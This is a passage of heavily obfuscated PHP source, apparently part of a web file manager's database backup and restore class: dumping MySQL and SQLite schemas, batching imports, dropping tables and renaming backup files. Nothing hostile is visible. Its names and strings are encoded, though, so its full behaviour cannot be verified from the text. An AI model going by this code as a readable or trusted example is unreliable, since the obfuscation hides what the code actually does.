"\x49\116\x53\x45\122\124\x20\x49\116\124\117\x20\140{$ÂÔ‹à»ø}\x60\40\x28\x60" . implode($ƒÓ„Şİ[1244], $¼ó†˜îü) . $ƒÓ„Şİ[1245]; fwrite($¬ªñ´¿, $îæ…­À« . implode($ƒÓ„Şİ[1246], $æ¿–•Á) . $ƒÓ„Şİ[74] . PHP_EOL); $ÅªŠ»Öâ += $ºüÒ—¦; if ($½Ü×ú¾Ë) { $½Ü×ú¾Ë->update($ºüÒ—¦); } } while ($ş§Ôçƒœ == $ºüÒ—¦); fclose($¬ªñ´¿); return $ÅªŠ»Öâ; } public function sqlToDb($¬Éü¹ã, &$—¦­¦ëª) { $²µÄùºç =& $_SERVER[©—Ò»ÅĞ]; $¹ş¨‘ìÁ = $this->model()->db(); $’°¤±ÁÒ = @fopen($¬Éü¹ã, $²µÄùºç[1247]); if (!$’°¤±ÁÒ) { return !1; } $ÇÁß€Éò = 0; $şç°¿Ş = $²µÄùºç[12]; $¹—¦ßÏ÷ = array(); $×åÈ·şş = $this->dbType(); $ÎğÄ•¬Î = $×åÈ·şş == $²µÄùºç[13] ? 500 : 2000; $û©×òö = basename($¬Éü¹ã, $²µÄùºç[891]); $Ÿ£“ÛŠÆ = 0; $Ùù¦öƒ‘ = 4194304; while (!feof($’°¤±ÁÒ)) { $¦›Ú¬Æ“ = trim(fgets($’°¤±ÁÒ)); if (!$¦›Ú¬Æ“) { continue; } $°½•É Û = $this->sqlDecode($¦›Ú¬Æ“, $×åÈ·şş, $û©×òö); if (stripos($°½•É Û, $²µÄùºç[430]) === 0) { if (!$şç°¿Ş) { $şç°¿Ş = $°½•É Û . $²µÄùºç[53]; } continue; } if ($—¦­¦ëª) { $—¦­¦ëª->task[$²µÄùºç[1232]] += 1; } $ÇÁß€Éò++; $¹—¦ßÏ÷[] = rtrim(rtrim(trim($°½•É Û), $²µÄùºç[50]), $²µÄùºç[74]); $´ş›ğóµ = null; $ŸÃßÖû = strlen($°½•É Û); $Ÿ£“ÛŠÆ += $ŸÃßÖû; $†¬Ä¡Ãµ = strlen($şç°¿Ş) + $Ÿ£“ÛŠÆ + (count($¹—¦ßÏ÷) - 1); if ($†¬Ä¡Ãµ >= $Ùù¦öƒ‘) { $´ş›ğóµ = array_pop($¹—¦ßÏ÷); if ($ÇÁß€Éò > 1) { $ÇÁß€Éò--; } } if ($ÇÁß€Éò >= $ÎğÄ•¬Î || $´ş›ğóµ) { $°½•É Û = $şç°¿Ş . implode($²µÄùºç[50], $¹—¦ßÏ÷); if (!$¹ş¨‘ìÁ->execute($°½•É Û)) { return !1; } if ($—¦­¦ëª) { $—¦­¦ëª->update($ÇÁß€Éò); } $¹—¦ßÏ÷ = array(); $ÇÁß€Éò = 0; $Ÿ£“ÛŠÆ = 0; if ($´ş›ğóµ) { $¹—¦ßÏ÷ = array($´ş›ğóµ); $ÇÁß€Éò = 1; $Ÿ£“ÛŠÆ = $ŸÃßÖû; } } } fclose($’°¤±ÁÒ); if (!empty($¹—¦ßÏ÷)) { $°½•É Û = $şç°¿Ş . implode($²µÄùºç[50], $¹—¦ßÏ÷); if (!$¹ş¨‘ìÁ->execute($°½•É Û)) { return !1; } if ($—¦­¦ëª) { $—¦­¦ëª->update($ÇÁß€Éò); } } return !0; } public function dropTable($É¦Óúº… = null) { $¤ûÅ™Œç =& $_SERVER[©—Ò»ÅĞ]; $áà®’„ª = $this->model()->db(); $°–ìÅŸß = $É¦Óúº… ? array($É¦Óúº…) : $áà®’„ª->getTables(); if (!$°–ìÅŸß) { return; } foreach ($°–ìÅŸß as $É¦Óúº…) { if ($É¦Óúº…) { $É¦Óúº… = strtolower($É¦Óúº…); } else { continue; } $áà®’„ª->execute($¤ûÅ™Œç[1248] . $this->escapeName($É¦Óúº…) . $¤ûÅ™Œç[1249]); } } private function sqlEncode($şáÛğşï) { $Ê±ï­äì =& $_SERVER[©—Ò»ÅĞ]; $Ø‘‘¥åª = array(); foreach ($şáÛğşï as $ÎûîéÜ) { if (is_array($ÎûîéÜ)) { $ÎûîéÜ = json_encode_force($ÎûîéÜ); } $ÎûîéÜ = addslashes($ÎûîéÜ); $ÎûîéÜ = str_replace(array($Ê±ï­äì[1250], $Ê±ï­äì[285], $Ê±ï­äì[417]), array($Ê±ï­äì[1251], $Ê±ï­äì[1252], $Ê±ï­äì[1253]), $ÎûîéÜ); $Ø‘‘¥åª[] = $ÎûîéÜ; } return $Ê±ï­äì[58] . implode($Ê±ï­äì[1254], $Ø‘‘¥åª) . $Ê±ï­äì[58]; } private function sqlDecode($¸“²‚ç¡, $Á¬ùøè, $—‚ÂØá¾ = '') { $£°‚†Í =& $_SERVER[©—Ò»ÅĞ]; $¸“²‚ç¡ = str_replace(array($£°‚†Í[1251], $£°‚†Í[1252], $£°‚†Í[1253]), array($£°‚†Í[1250], $£°‚†Í[285], $£°‚†Í[417]), $¸“²‚ç¡); if ($Á¬ùøè == $£°‚†Í[13]) { $¸“²‚ç¡ = str_ireplace($£°‚†Í[1255], $£°‚†Í[59], $¸“²‚ç¡); $¸“²‚ç¡ = stripslashes($¸“²‚ç¡); } return preg_replace($£°‚†Í[1256], $£°‚†Í[12], $¸“²‚ç¡); if ($Á¬ùøè == $£°‚†Í[13]) { return $—‚ÂØá¾ != $£°‚†Í[472] ? stripslashes($¸“²‚ç¡) : $¸“²‚ç¡; } if ($—‚ÂØá¾ == $£°‚†Í[472]) { $¸“²‚ç¡ = str_replace($£°‚†Í[1257], $£°‚†Í[118], stripslashes($¸“²‚ç¡)); } return $¸“²‚ç¡; } public function getSqlFile($²±’Ô‹¯ = '') { $‚Á‹Éˆ =& $_SERVER[©—Ò»ÅĞ]; $ÏãÃ±ï = $this->dbType(!0); $”şŸ = CONTROLLER_DIR . "\151\156\x73\164\x61\x6c\x6c\57\x64\141\164\x61\57{$ÏãÃ±ï}\x2e\163\x71\154"; if (!file_exists($”şŸ)) { return !1; } $Éâ—èüï = file_get_contents($”şŸ); $Æç´Şİ = $‚Á‹Éˆ[1258] . ($ÏãÃ±ï == $‚Á‹Éˆ[901] ? $‚Á‹Éˆ[1259] : $‚Á‹Éˆ[1260]) . $‚Á‹Éˆ[1261]; preg_match_all($Æç´Şİ, $Éâ—èüï, $†Şš¨¢); $¡„¯ç = $†Şš¨¢[1]; $”¬í¾ÆŠ = $this->model()->db(); $İéà–­¯ = $”¬í¾ÆŠ->getTables(); $ÌëÆßîá = TEMP_FILES . $‚Á‹Éˆ[1262] . date($‚Á‹Éˆ[259]) . $‚Á‹Éˆ[8]; del_dir($ÌëÆßîá); mk_dir($ÌëÆßîá); $Ÿ‡¿”õÃ = $ÌëÆßîá . $‚Á‹Éˆ[1263]; $³„ˆ–ñ = $ÌëÆßîá . $‚Á‹Éˆ[1264]; $›ÊŞ‰ĞÁ = $ÏãÃ±ï == $‚Á‹Éˆ[13] ? $‚Á‹Éˆ[901] : $‚Á‹Éˆ[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\154\154\57\144\141\x74\x61\57{$›ÊŞ‰ĞÁ}\x2e\163\161\154", $ÌëÆßîá); @touch($ÌëÆßîá . $ÏãÃ±ï . $‚Á‹Éˆ[891]); $˜×”˜» = fopen($Ÿ‡¿”õÃ, $‚Á‹Éˆ[1236]); $éå³û¨ú = fopen($³„ˆ–ñ, $‚Á‹Éˆ[1236]); if ($ÏãÃ±ï == $‚Á‹Éˆ[13]) { $İéà–­¯ = array_diff($İéà–­¯, array($‚Á‹Éˆ[884], $‚Á‹Éˆ[885])); $°·¶”ØÔ = array($‚Á‹Éˆ[1265], $‚Á‹Éˆ[1266], $‚Á‹Éˆ[1267]); fwrite($éå³û¨ú, implode(PHP_EOL, $°·¶”ØÔ) . PHP_EOL . PHP_EOL); foreach ($İéà–­¯ as $Úâ ¶Ñ) { $¯öÊ«°à = $this->sqlFromSqlite($Úâ ¶Ñ); if (!$¯öÊ«°à[$‚Á‹Éˆ[13]]) { continue; } fwrite($éå³û¨ú, $¯öÊ«°à[$‚Á‹Éˆ[13]] . PHP_EOL . PHP_EOL); if (!in_array($Úâ ¶Ñ, $¡„¯ç)) { fwrite($˜×”˜», $¯öÊ«°à[$‚Á‹Éˆ[901]] . PHP_EOL . PHP_EOL); } } } else { foreach ($İéà–­¯ as $Úâ ¶Ñ) { $¯öÊ«°à = $this->sqlFromMysql($Úâ ¶Ñ); if (!$¯öÊ«°à[$‚Á‹Éˆ[901]]) { continue; } fwrite($˜×”˜», $¯öÊ«°à[$‚Á‹Éˆ[901]] . PHP_EOL . PHP_EOL); if (!in_array($Úâ ¶Ñ, $¡„¯ç)) { fwrite($éå³û¨ú, $¯öÊ«°à[$‚Á‹Éˆ[13]] . PHP_EOL . PHP_EOL); } } } fclose($˜×”˜»); fclose($éå³û¨ú); $Éâ—èüï = array($‚Á‹Éˆ[901] => $Ÿ‡¿”õÃ, $‚Á‹Éˆ[13] => $³„ˆ–ñ); return $²±’Ô‹¯ ? $Éâ—èüï[$²±’Ô‹¯] : $Éâ—èüï; } public function dbType($ŒÚÌÇËà = false) { $­·…£¼· =& $_SERVER[©—Ò»ÅĞ]; $óÜ…©” = $ŒÚÌÇËà ? $GLOBALS[$­·…£¼·[6]][$­·…£¼·[21]] : $this->database; $óÜ…©” = array_change_key_case($óÜ…©”); $¦×í÷÷¤ = $óÜ…©”[$­·…£¼·[1135]]; if ($¦×í÷÷¤ == $­·…£¼·[1132]) { $İ¡«Ï—Ü = explode($­·…£¼·[4], $óÜ…©”[$­·…£¼·[1141]]); $¦×í÷÷¤ = $İ¡«Ï—Ü[0]; } $Øñ–Ø” = array($­·…£¼·[1268] => $­·…£¼·[13], $­·…£¼·[1077] => $­·…£¼·[901]); if (isset($Øñ–Ø”[$¦×í÷÷¤])) { $¦×í÷÷¤ = $Øñ–Ø”[$¦×í÷÷¤]; } return $¦×í÷÷¤; } public function sqlFromMysql($õôÍ¨×, $ß‡€£ğİ = '') { $İéÓœ›ç =& $_SERVER[©—Ò»ÅĞ]; $á¯óë¢É = array($İéÓœ›ç[901] => $İéÓœ›ç[12], $İéÓœ›ç[13] => $İéÓœ›ç[12]); $ÖúŸ¾í™ = $this->escapeName($õôÍ¨×); $ùåØŒº… = $this->escapeName($õôÍ¨×, $İéÓœ›ç[13]); $ØŞÄŒóí = $this->model()->db(); $ˆ­…‚×ä = $ØŞÄŒóí->query("\163\x68\157\x77\x20\x63\x72\x65\x61\164\x65\x20\164\x61\x62\x6c\145\x20{$ÖúŸ¾í™}\x3b"); if (!$ˆ­…‚×ä || !$ˆ­…‚×ä[0]) { return !1; } $Áıìí›£ = _get($ˆ­…‚×ä[0], $İéÓœ›ç[1269], $İéÓœ›ç[12]); if (!$Áıìí›£) { return !1; } $¡ßËíÌ± = "\104\122\x4f\120\40\x54\x41\x42\x4c\105\40\x49\x46\40\105\130\x49\123\124\123\40{$ÖúŸ¾í™}\x3b" . PHP_EOL . $Áıìí›£ . $İéÓœ›ç[74]; if ($ß‡€£ğİ == $İéÓœ›ç[901]) { return $¡ßËíÌ±; } $á¯óë¢É[$İéÓœ›ç[901]] = $¡ßËíÌ±; $á¼‡À¦ = array_change_key_case($GLOBALS[$İéÓœ›ç[6]][$İéÓœ›ç[21]]); $®éä·£× = $á¼‡À¦[$İéÓœ›ç[1140]]; $Üß¬ßÉ£ = $İéÓœ›ç[1270] . $®éä·£× . "\47\x20\x41\x4e\x44\x20\x54\101\102\x4c\105\137\116\x41\115\105\40\x3d\40{$ùåØŒº…}\x3b"; $Åø¤€¸ = "\123\110\x4f\x57\x20\111\x4e\x44\105\130\40\x46\122\117\x4d\40{$ÖúŸ¾í™}\x3b"; $§ò¬¸¡ú = $ØŞÄŒóí->query($Üß¬ßÉ£); if (empty($§ò¬¸¡ú)) { return $ß‡€£ğİ ? $á¯óë¢É[$ß‡€£ğİ] : $á¯óë¢É; } $ÊÓíÎ› = $ØŞÄŒóí->query($Åø¤€¸); $‡µØİä‚ = $İéÓœ›ç[12]; $Ç´î»ó = array(); foreach ($ÊÓíÎ› as $ÇğİÛù–) { if (!$‡µØİä‚ && $ÇğİÛù–[$İéÓœ›ç[1271]] == $İéÓœ›ç[1272]) { $‡µØİä‚ = $ÇğİÛù–[$İéÓœ›ç[1273]]; } if (isset($Ç´î»ó[$ÇğİÛù–[$İéÓœ›ç[1271]]])) { $Ç´î»ó[$ÇğİÛù–[$İéÓœ›ç[1271]]][$İéÓœ›ç[1274]][] = $ÇğİÛù–[$İéÓœ›ç[1273]]; continue; } $Ç´î»ó[$ÇğİÛù–[$İéÓœ›ç[1271]]] = array($İéÓœ›ç[1275] => $ÇğİÛù–[$İéÓœ›ç[1271]], $İéÓœ›ç[1274] => array($ÇğİÛù–[$İéÓœ›ç[1273]]), $İéÓœ›ç[1276] => $ÇğİÛù–[$İéÓœ›ç[1277]] == $İéÓœ›ç[91] ? 0 : 1); } $Û£·‚“ = array(); foreach ($Ç´î»ó as $ÇğİÛù–) { $”Šî³Ò = $ÇğİÛù–[$İéÓœ›ç[1275]] == $İéÓœ›ç[1272]; $ÎÈãÆ­İ = $ÇğİÛù–[$İéÓœ›ç[1276]] == $İéÓœ›ç[91] && !$”Šî³Ò ? $İéÓœ›ç[1278] : $İéÓœ›ç[12]; $©Ù«ÀŠƒ = $İéÓœ›ç[1279] . $õôÍ¨× . $İéÓœ›ç[11] . ($”Šî³Ò ? $İéÓœ›ç[1280] : $ÇğİÛù–[$İéÓœ›ç[1275]]); $Ş©åı¨ = $İéÓœ›ç[1281] . implode($İéÓœ›ç[1282], $ÇğİÛù–[$İéÓœ›ç[1274]]) . $İéÓœ›ç[1283]; $Û£·‚“[] = sprintf($İéÓœ›ç[1284], $İéÓœ›ç[1285], $ÎÈãÆ­İ, $İéÓœ›ç[1286], $©Ù«ÀŠƒ, $İéÓœ›ç[1287], $õôÍ¨×, $Ş©åı¨); } $øº« Ã¶ = array(); $šÃ¶ë– = array($İéÓœ›ç[1288] => $İéÓœ›ç[390], $İéÓœ›ç[1289] => $İéÓœ›ç[390], $İéÓœ›ç[364] => $İéÓœ›ç[390], $İéÓœ›ç[363] => $İéÓœ›ç[390], $İéÓœ›ç[1290] => $İéÓœ›ç[1291], $İéÓœ›ç[1292] => $İéÓœ›ç[1291], $İéÓœ›ç[1291] => $İéÓœ›ç[1291], $İéÓœ›ç[1293] => $İéÓœ›ç[1291], $İéÓœ›ç[282] => $İéÓœ›ç[1291], $İéÓœ›ç[1294] => $İéÓœ›ç[1291], $İéÓœ›ç[1295] => $İéÓœ›ç[1291], $İéÓœ›ç[1296] => $İéÓœ›ç[1297], $İéÓœ›ç[365] => $İéÓœ›ç[1297], $İéÓœ›ç[366] => $İéÓœ›ç[1297], $İéÓœ›ç[1298] => $İéÓœ›ç[1298]); foreach ($§ò¬¸¡ú as $ÇğİÛù–) { $ß‡€£ğİ = _get($šÃ¶ë–, $ÇğİÛù–[$İéÓœ›ç[1299]], $ÇğİÛù–[$İéÓœ›ç[1300]]); $‘³•á–  = $ÇğİÛù–[$İéÓœ›ç[1301]] == $İéÓœ›ç[1059] ? $İéÓœ›ç[1302] : $İéÓœ›ç[1303]; $¯èå‘×‹ = $ÇğİÛù–[$İéÓœ›ç[1304]] == $‡µØİä‚ ? $İéÓœ›ç[1305] : $İéÓœ›ç[12]; $šªŞ = $ÇğİÛù–[$İéÓœ›ç[1114]] ? strtoupper(str_replace($İéÓœ›ç[11], $İéÓœ›ç[12], $ÇğİÛù–[$İéÓœ›ç[1114]])) : $İéÓœ›ç[12]; $øº« Ã¶[] = sprintf($İéÓœ›ç[1306], $ÇğİÛù–[$İéÓœ›ç[1304]], $ß‡€£ğİ, $‘³•á– , $¯èå‘×‹, $šªŞ); } $•÷ı˜ğ— = array("\x44\x52\117\120\x20\x54\x41\x42\114\105\x20\x49\x46\x20\x45\x58\111\123\124\123\x20{$ùåØŒº…}\x3b", "\103\x52\x45\x41\124\105\x20\x54\101\x42\x4c\x45\x20{$ùåØŒº…}\x20\x28", implode($İéÓœ›ç[50] . PHP_EOL, $øº« Ã¶), $İéÓœ›ç[1307]); $âÎæ™îö = implode(PHP_EOL, array_merge($•÷ı˜ğ—, $Û£·‚“)); if ($ß‡€£ğİ == $İéÓœ›ç[13]) { return $âÎæ™îö; } $á¯óë¢É[$İéÓœ›ç[13]] = $âÎæ™îö; return $á¯óë¢É; } public function sqlFromSqlite($Ÿ¾¡È¥°, $ûé…çˆ¶ = '') { $Éß¤”±¾ =& $_SERVER[©—Ò»ÅĞ]; $š˜èÓ‰½ = array($Éß¤”±¾[901] => $Éß¤”±¾[12], $Éß¤”±¾[13] => $Éß¤”±¾[12]); $òàØó¥Ç = $this->escapeName($Ÿ¾¡È¥°); $ØÇĞŒ©® = $this->escapeName($Ÿ¾¡È¥°, $Éß¤”±¾[13]); $ñæ¯í»› = $this->model()->db(); $×Æùêµ = "\x50\x52\101\107\x4d\x41\x20\124\x41\102\x4c\105\137\x49\116\106\x4f\40\50\x27{$Ÿ¾¡È¥°}\x27\x29"; $Ê²£¤‡ñ = "\123\105\x4c\105\103\x54\x20\x2a\x20\x46\x52\117\x4d\x20\x73\161\x6c\x69\164\x65\137\x6d\141\163\x74\x65\x72\40\127\110\105\x52\105\40\x74\142\154\137\x6e\x61\x6d\x65\x20\x3d\40\47{$Ÿ¾¡È¥°}\x27"; $Õ‡†É = $ñæ¯í»›->query($×Æùêµ); if (empty($Õ‡†É)) { return $ûé…çˆ¶ ? $š˜èÓ‰½[$ûé…çˆ¶] : $š˜èÓ‰½; } $”ÂĞ¾Œ = $ñæ¯í»›->query($Ê²£¤‡ñ); $ÖŠ­å®¦ = $ò¿ôâ¾Ê = array(); foreach ($”ÂĞ¾Œ as $ëãÌ¨) { if ($ëãÌ¨[$Éß¤”±¾[33]] == $Éß¤”±¾[357]) { $ÖŠ­å®¦[] = $ëãÌ¨[$Éß¤”±¾[1308]]; } else { $ò¿ôâ¾Ê[] = $ëãÌ¨[$Éß¤”±¾[1308]]; } } $²š’Õ¶ä = array_merge(array("\104\x52\x4f\120\x20\x54\x41\x42\x4c\x45\x20\x49\x46\40\105\130\111\x53\x54\x53\40{$ØÇĞŒ©®}\73"), $ÖŠ­å®¦, $ò¿ôâ¾Ê); $²š’Õ¶ä = implode($Éß¤”±¾[74] . PHP_EOL, $²š’Õ¶ä) . $Éß¤”±¾[74]; if ($ûé…çˆ¶ == $Éß¤”±¾[13]) { return $²š’Õ¶ä; } $š˜èÓ‰½[$Éß¤”±¾[13]] = $²š’Õ¶ä; $ƒöúøŠÚ = $§ªçæÉ = array(); $’ÈĞËäé = array(); $ÇÆÚ±£Ÿ = array(); foreach ($”ÂĞ¾Œ as $ëãÌ¨) { if ($ëãÌ¨[$Éß¤”±¾[33]] == $Éß¤”±¾[1309]) { $»¸Š¼ÍÎ = $ëãÌ¨[$Éß¤”±¾[1308]]; $üÏ³ô = stripos($»¸Š¼ÍÎ, $Éß¤”±¾[1278]) !== !1; $´ë‚ìòø = stripos($»¸Š¼ÍÎ, $Éß¤”±¾[1272]) !== !1; preg_match($Éß¤”±¾[1310], $»¸Š¼ÍÎ, $ÖÔÅÏ“); if (empty($ÖÔÅÏ“)) { continue; } $Ûõ½Ú— = array_map($Éß¤”±¾[1311], explode($Éß¤”±¾[50], $ÖÔÅÏ“[1])); $¨Ç‘áÄ = array(); foreach ($Ûõ½Ú— as $ŒŒ…œæ€) { $‚úËÛÍõ = trim($ŒŒ…œæ€, $Éß¤”±¾[1312]); $¨Ç‘áÄ[] = $‚úËÛÍõ; $’ÈĞËäé[$‚úËÛÍõ] = !0; } $ÇÆÚ±£Ÿ[] = array($Éß¤”±¾[32] => $ëãÌ¨[$Éß¤”±¾[32]], $Éß¤”±¾[1308] => $»¸Š¼ÍÎ, $Éß¤”±¾[1313] => $üÏ³ô, $Éß¤”±¾[1314] => $´ë‚ìòø, $Éß¤”±¾[1315] => $¨Ç‘áÄ); } } $À´É’¹ı = array($Éß¤”±¾[1289] => $Éß¤”±¾[1289], $Éß¤”±¾[390] => $Éß¤”±¾[1316], $Éß¤”±¾[1297] => $Éß¤”±¾[1317], $Éß¤”±¾[1291] => $Éß¤”±¾[1291], $Éß¤”±¾[1298] => $Éß¤”±¾[1318], $Éß¤”±¾[1319] => $Éß¤”±¾[1320]); $’¤Ú»êè = array($Éß¤”±¾[451], $Éß¤”±¾[168], $Éß¤”±¾[540]); $¼•œÙÓõ = array($Éß¤”±¾[390], $Éß¤”±¾[1297], $Éß¤”±¾[1319], $Éß¤”±¾[1289]); foreach ($Õ‡†É as $ëãÌ¨) { $ìîæ Æ» = $ëãÌ¨[$Éß¤”±¾[32]]; $åÇÅâãó = strtolower($ëãÌ¨[$Éß¤”±¾[33]]); if ($åÇÅâãó == $Éß¤”±¾[1291] && isset($’ÈĞËäé[$ìîæ Æ»])) { $ûé…çˆ¶ = in_array($ìîæ Æ», $’¤Ú»êè) ? $Éß¤”±¾[1291] : $Éß¤”±¾[1321]; } else { $ûé…çˆ¶ = _get($À´É’¹ı, $åÇÅâãó, $åÇÅâãó); } if ($ëãÌ¨[$Éß¤”±¾[57]] > 0) { $§ªçæÉ[$ëãÌ¨[$Éß¤”±¾[57]]] = $ìîæ Æ»; } $ƒ‹Ùè–¦ = $Éß¤”±¾[12]; if ($ëãÌ¨[$Éß¤”±¾[56]] !== null) { $ã²ë§ß½ = $ëãÌ¨[$Éß¤”±¾[56]]; if (in_array($åÇÅâãó, $¼•œÙÓõ) && is_numeric($ã²ë§ß½)) { $ƒ‹Ùè–¦ = "\x44\105\106\x41\x55\x4c\x54\40{$ã²ë§ß½}"; } else { if (strtolower($ã²ë§ß½) === $Éß¤”±¾[103]) { $ƒ‹Ùè–¦ = $ëãÌ¨[$Éß¤”±¾[35]] ? $Éß¤”±¾[12] : $Éß¤”±¾[1303]; } else { $ñ¡ºÍÙõ = is_numeric($ã²ë§ß½) ? $ã²ë§ß½ : $Éß¤”±¾[58] . addslashes($ã²ë§ß½) . $Éß¤”±¾[58]; $ƒ‹Ùè–¦ = "\x44\105\x46\x41\125\114\x54\x20{$ñ¡ºÍÙõ}"; } } } $Á¼à×â² = $ëãÌ¨[$Éß¤”±¾[35]] ? $Éß¤”±¾[1302] : $Éß¤”±¾[1322]; $şË¨É‘ï = stripos($åÇÅâãó, $Éß¤”±¾[364]) !== !1 && $ëãÌ¨[$Éß¤”±¾[57]] ? $Éß¤”±¾[1323] : $Éß¤”±¾[12]; $ƒöúøŠÚ[] = sprintf($Éß¤”±¾[1324], $ìîæ Æ», $ûé…çˆ¶, $Á¼à×â², $ƒ‹Ùè–¦, $şË¨É‘ï); } if (!empty($§ªçæÉ)) { ksort($§ªçæÉ); $Á­îÁÇ› = $Éß¤”±¾[475] . implode($Éß¤”±¾[1244], $§ªçæÉ) . $Éß¤”±¾[475]; $ƒöúøŠÚ[] = "\120\x52\x49\x4d\x41\x52\x59\40\113\105\131\x20\50{$Á­îÁÇ›}\51"; } foreach ($ÇÆÚ±£Ÿ as $·ıÀâ‘ô) { if ($·ıÀâ‘ô[$Éß¤”±¾[1314]]) { continue; } $«ÎÙº÷¹ = array(); foreach ($·ıÀâ‘ô[$Éß¤”±¾[1315]] as $ŒŒ…œæ€) { $À´É’¹ı = null; foreach ($Õ‡†É as $—Ã³±Ö£) { if ($—Ã³±Ö£[$Éß¤”±¾[32]] == $ŒŒ…œæ€) { $À´É’¹ı = strtolower($—Ã³±Ö£[$Éß¤”±¾[33]]); break; } } if ($À´É’¹ı == $Éß¤”±¾[1291] && in_array($ŒŒ…œæ€, $’¤Ú»êè)) { $«ÎÙº÷¹[] = "\140{$ŒŒ…œæ€}\140\50\x32\x35\x30\51"; } else { $«ÎÙº÷¹[] = "\x60{$ŒŒ…œæ€}\x60"; } } $åÇÅâãó = ($·ıÀâ‘ô[$Éß¤”±¾[1313]] ? $Éß¤”±¾[1325] : $Éß¤”±¾[12]) . $Éß¤”±¾[1326]; $ŞüÇµùê = str_replace($Éß¤”±¾[1279] . $Ÿ¾¡È¥° . $Éß¤”±¾[11], $Éß¤”±¾[12], $·ıÀâ‘ô[$Éß¤”±¾[32]]); $ŞüÇµùê = str_replace($Ÿ¾¡È¥° . $Éß¤”±¾[11], $Éß¤”±¾[12], $ŞüÇµùê); $ƒöúøŠÚ[] = "{$åÇÅâãó}\40\x60{$ŞüÇµùê}\140\40\x28" . implode($Éß¤”±¾[50], $«ÎÙº÷¹) . $Éß¤”±¾[1243]; } $µ ­§Öİ = array("\x44\x52\117\120\x20\124\x41\x42\114\x45\x20\111\x46\x20\x45\130\x49\x53\x54\123\x20{$òàØó¥Ç}\x3b", "\103\x52\x45\101\124\x45\40\124\x41\102\114\105\40{$òàØó¥Ç}\x20\x28", implode($Éß¤”±¾[50] . PHP_EOL, $ƒöúøŠÚ), $Éß¤”±¾[1327]); $µ ­§Öİ = implode(PHP_EOL, $µ ­§Öİ); if ($ûé…çˆ¶ == $Éß¤”±¾[901]) { return $µ ­§Öİ; } $š˜èÓ‰½[$Éß¤”±¾[901]] = $µ ­§Öİ; return $š˜èÓ‰½; } private function escapeName($Ç÷öƒ€, $¾÷—ü–– = "\x6d\x79\x73\161\154") { $¡½¨‚­ã =& $_SERVER[©—Ò»ÅĞ]; $Ç÷öƒ€ = preg_replace($¡½¨‚­ã[1328], $¡½¨‚­ã[12], $Ç÷öƒ€); if ($¾÷—ü–– === $¡½¨‚­ã[901]) { return "\140{$Ç÷öƒ€}\x60"; } return "\x22{$Ç÷öƒ€}\42"; } public function mixBakList($±Š’ğ×Í) { $ŠÂ¶Îóê =& $_SERVER[©—Ò»ÅĞ]; $±Š’ğ×Í = rtrim($±Š’ğ×Í, $ŠÂ¶Îóê[8]) . $ŠÂ¶Îóê[8]; $ş¡ıÌï† = $ŠÂ¶Îóê[1329]; $ÈèîÓ»ƒ = IO::listPath($±Š’ğ×Í); if (empty($ÈèîÓ»ƒ[$ŠÂ¶Îóê[86]])) { return !1; } $ÑÈñÇáº = array(); foreach ($ÈèîÓ»ƒ[$ŠÂ¶Îóê[86]] as $„Ö¿æÍ => $—ùÓ´Áû) { if (!$—ùÓ´Áû[$ŠÂ¶Îóê[32]] || !$—ùÓ´Áû[$ŠÂ¶Îóê[87]]) { continue; } $ŞŞØÙ¿ = Mcrypt::encode($—ùÓ´Áû[$ŠÂ¶Îóê[32]], $ş¡ıÌï†); $ÓµŠ†¯ş = md5($ŞŞØÙ¿); IO::rename($—ùÓ´Áû[$ŠÂ¶Îóê[87]], $ÓµŠ†¯ş); $ÑÈñÇáº[$ÓµŠ†¯ş] = $ŞŞØÙ¿; } $ùŸÖ±À¡ = md5($ŠÂ¶Îóê[1330] . $ş¡ıÌï†); IO::setContent($±Š’ğ×Í . $ùŸÖ±À¡, json_encode($ÑÈñÇáº)); return !0; } public function unmixBakList($Ûñéàôó) { $ÅœËé¡ =& $_SERVER[©—Ò»ÅĞ]; $Ûñéàôó = rtrim($Ûñéàôó, $ÅœËé¡[8]) . $ÅœËé¡[8]; $‚©¬‰á„ = $this->unmixBakListGet($Ûñéàôó, !0); if (empty($‚©¬‰á„)) { return !1; } foreach ($‚©¬‰á„ as $ÇÓ¨Áœ¿ => $ıŞÔš½) { $Ù‹€¡’² = IO::rename($Ûñéàôó . $ıŞÔš½, $ÇÓ¨Áœ¿); if (!$Ù‹€¡’²) { return !1; } } return !0; } public function unmixBakListGet($ÂÄ€¦ÒÍ, $¦ùÖÁÎ½ = false) { $ôï¶˜’î =& $_SERVER[©—Ò»ÅĞ]; $ÂÄ€¦ÒÍ = rtrim($ÂÄ€¦ÒÍ, $ôï¶˜’î[8]) . $ôï¶˜’î[8]; $ş¾íÄÌ® = $ôï¶˜’î[1329]; $æ¤¬â— = md5($ôï¶˜’î[1330] . $ş¾íÄÌ®); $Ø«Úš¼Ì = $ÂÄ€¦ÒÍ . $æ¤¬â—; if (!IO::exist($Ø«Úš¼Ì)) { return !1; } $…Úå€ˆ = json_decode(IO::getContent($Ø«Úš¼Ì), !0); if (empty($…Úå€ˆ)) { return !1; } $“ ±•ÙÊ = array(); foreach ($…Úå€ˆ as $ƒÈ…ùœ… => $ÅÂ¦‚ÁÏ) { $æ¤¬â— = Mcrypt::decode($ÅÂ¦‚ÁÏ, $ş¾íÄÌ®); $“ ±•ÙÊ[$æ¤¬â—] = $ƒÈ…ùœ…; } if ($¦ùÖÁÎ½) { IO::remove($Ø«Úš¼Ì, !1); } return $“ ±•ÙÊ; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Óã¨èµŠ, $ œÍÒìÎ) { $¸²«„›ø =& $_SERVER[©—Ò»ÅĞ]; $›î†Ù– = $ œÍÒìÎ; $GLOBALS[$¸²«„›ø[1331]] = $¸²«„›ø[1332] . $Óã¨èµŠ; Hook::trigger($¸²«„›ø[1332] . $Óã¨èµŠ . $¸²«„›ø[1333], $›î†Ù–); $µŞ‹Îˆ = self::driverMake($ œÍÒìÎ[0]); if (!$µŞ‹Îˆ) { return !1; } if ($Óã¨èµŠ == $¸²«„›ø[641] || $Óã¨èµŠ == $¸²«„›ø[643] || $Óã¨èµŠ == $¸²«„›ø[1334]) { if (!trim($µŞ‹Îˆ->path . $¸²«„›ø[463], $¸²«„›ø[8])) { return !1; } } if (method_exists($µŞ‹Îˆ, $Óã¨èµŠ)) { $Øº„´Îµ = @call_user_func_array(array($µŞ‹Îˆ, $Óã¨èµŠ), $ œÍÒìÎ); } else { if (method_exists($µŞ‹Îˆ, $¸²«„›ø[1335])) { $Øº„´Îµ = @call_user_func_array(array($µŞ‹Îˆ, $Óã¨èµŠ), $ œÍÒìÎ); } else { if 